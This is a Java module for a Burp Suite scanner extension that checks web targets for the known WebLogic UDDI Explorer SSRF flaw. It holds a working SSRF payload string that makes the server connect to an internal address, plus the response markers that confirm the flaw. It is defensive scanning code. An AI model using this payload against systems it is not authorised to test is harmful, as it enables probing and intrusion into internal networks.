package burp.scan.active.poc;

import burp.IBurpExtenderCallbacks;
import burp.IScanIssue;
import burp.scan.active.ModuleBase;
import burp.scan.lib.Confidence;
import burp.scan.lib.GtScanIssue;
import burp.scan.lib.Risk;
import burp.scan.lib.web.WebPageInfo;
import burp.scan.lib.web.utils.GtRequest;
import burp.scan.lib.web.utils.GtSession;
import burp.scan.lib.web.utils.GtURL;
import burp.scan.tags.TagTypes;
import burp.scan.tags.TagUtils;

import java.io.IOException;
import java.net.URL;
import java.util.HashSet;
import java.util.Set;

public class WebLogicSSRF implements ModuleBase {
    static String payload = "/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.1.1.1:700";
    @Override
    public void scan(IBurpExtenderCallbacks callbacks, WebPageInfo webInfo) {
        var url = new GtURL(webInfo.getUrl());
        String baseUrl = url.getBaseUrl();
        String targetUrl = baseUrl + payload;
        var session = GtSession.getGlobalSession();
        GtRequest request = new GtRequest(targetUrl);
        request.setHeader("Cookie","publicinquiryurls=http://www-3.ibm.com/services/uddi/inquiryapi!IBM|http://www-3.ibm.com/services/uddi/v2beta/inquiryapi!IBM V2|http://uddi.rte.microsoft.com/inquire!Microsoft|http://services.xmethods.net/glue/inquire/uddi!XMethods|;");
        try {
            var response = session.sendRequest(request);
            String respBody = new String(response.getBody());
            if (response.getStatudCode() == 200 && (respBody.contains("&#39;127.1.1.1&#39;, port: &#39;700&#39;")||respBody.contains("Socket Closed"))) {
                IScanIssue issue = new GtScanIssue(
                        response.getRequestResponse().getHttpService(),
                        new URL(targetUrl),
                        response.getRequestResponse(),
                        "WebLogic SSRF",
                        "",
                        "",
                        Risk.Medium,
                        Confidence.Certain
                );
                webInfo.addIssue(issue);
                callbacks.addScanIssue(issue);
            }
        } catch (IOException e) {

        }
    }

    @Override
    public Set<String> getTags() {
        Set<String> res = new HashSet<>();
        res.add(TagUtils.toStandardName(TagTypes.WebLogic_Java));
        return res;
    }
}
